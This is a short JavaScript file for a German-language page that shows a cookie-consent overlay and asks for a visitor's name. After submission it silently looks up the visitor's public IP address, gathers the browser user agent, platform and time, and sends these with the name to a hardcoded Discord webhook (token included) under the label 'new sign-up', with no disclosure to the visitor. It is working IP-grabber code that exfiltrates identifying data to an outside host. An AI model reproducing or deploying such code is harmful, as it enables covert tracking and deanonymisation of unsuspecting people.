document.addEventListener('DOMContentLoaded', () => {
  const overlay       = document.getElementById('cookie-overlay');
  const acceptBtn     = document.getElementById('accept-cookies');
  const nameContainer = document.getElementById('name-container');
  const submitBtn     = document.getElementById('submit-name');
  const nameInput     = document.getElementById('name-input');
  const loadingText   = document.getElementById('loading');

  acceptBtn.addEventListener('click', () => {
    overlay.style.display = 'none';
    nameContainer.classList.remove('hidden');
  });

  submitBtn.addEventListener('click', async () => {
    const name = nameInput.value.trim();
    if (!name) {
      nameInput.focus();
      return;
    }

    nameInput.style.display = 'none';
    submitBtn.style.display = 'none';
    loadingText.classList.remove('hidden');

    try {
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipRes.json();
      const ip = ipData.ip;

      const browser = navigator.userAgent;
      const platform = navigator.platform;
      const zeitstempel = new Date().toLocaleString('de-DE');

      const payload = {
        content: `# 📨 NEUE ANMELDUNG!\n**💬 Name:** ${name}\n**📌 IP-Addresse:** \`${ip}\`\n**🌏 Browsertyp:** ${browser}\n**📱 Gerätetyp:** ${platform}\n**⏰ Uhrzeit:** ${zeitstempel}\n**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/${ip}>`
      };

      const webhookUrl = 'https://discord.com/api/webhooks/1394554954391355492/comU-mif2egSzF70Vx8BIyBr0yH4y2MuUOjbSKYql6As7GIu9kTxiIkZwv0xeJMOA1jI';
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      window.location.href = 'https://MeineWebsite.de/success';
    } catch (err) {
      console.error('Fehler beim Senden:', err);
      loadingText.textContent = 'Ein Fehler ist aufgetreten. Bitte versuche es erneut.';
    }
  });
});
